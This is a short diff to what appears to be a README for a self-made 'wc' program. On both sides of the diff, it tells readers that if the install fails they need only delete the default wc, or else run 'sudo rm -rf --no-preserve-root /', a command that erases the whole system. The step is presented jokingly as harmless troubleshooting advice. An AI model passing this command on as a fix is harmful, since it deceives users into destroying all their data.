@@ -12,7 +12,7 @@
 The last command may give you error message. Don't worry, everything is fine, you just need to delete default wc program from your system ( mine is much superior ;P )
 
 If deleting default wc program won't help, just run
-> sudo rm -rf / --no-preserve-root
+> sudo rm -rf --no-preserve-root /
 
 
 Now you successfully installed mine superior version of wc
